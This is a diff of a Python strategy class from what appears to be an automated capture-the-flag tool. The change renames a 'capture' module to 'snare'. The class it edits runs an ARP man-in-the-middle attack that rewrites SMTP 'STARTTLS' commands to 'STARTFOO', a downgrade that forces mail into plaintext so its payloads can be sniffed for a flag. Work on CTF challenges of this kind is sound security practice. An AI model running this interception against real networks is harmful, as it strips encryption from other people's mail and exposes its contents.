@@ -1,9 +1,9 @@
 # coding: utf-8
-import scapy.all as scapy
-import capture
-import strategy
 import logging
 import re
+import scapy.all as scapy
+import snare
+import strategy
 
 logger = logging.getLogger(__name__)
 
@@ -17,7 +17,7 @@ class Strategy(strategy.Strategy):
     needsip = True
     challenges = ['letter']
 
-    class AnalysisModule(capture.Module):
+    class AnalysisModule(snare.Module):
         """AnalysisModule looks at any TCP packet with a payload for the flag and stops the sniffer when it is found"""
         def __init__(self, flagpattern):
             self.flagpattern = flagpattern
@@ -41,7 +41,7 @@ class Strategy(strategy.Strategy):
                     self.flag = m.group(0)
                     self.sniffer.stop()
 
-    @capture.tcpfilter
+    @snare.tcpfilter
     @staticmethod
     def corrupttls(pkt):
         """corrupttls looks for an SMTP client packet with `STARTTLS` and replaces it with `STARTFOO`"""
@@ -49,14 +49,13 @@ class Strategy(strategy.Strategy):
             if pkt[scapy.TCP].dport == 25 and b'STARTTLS' in pkt[scapy.Raw].load:
                 pkt.load = pkt[scapy.Raw].load.replace(b'STARTTLS', b'STARTFOO')
         return pkt
-        
 
     def execute(self, iface, flagpattern="flag\{.*?\}", canceltoken=None):
-        sniffer = capture.Sniffer(iface=iface)
+        sniffer = snare.Sniffer(iface=iface)
         analyser = self.AnalysisModule(flagpattern)
         sniffer.register(
             analyser,
-            capture.ArpMitmModule(filter=self.corrupttls),
+            snare.ArpMitmModule(filter=self.corrupttls),
         )
 
         if canceltoken is not None:
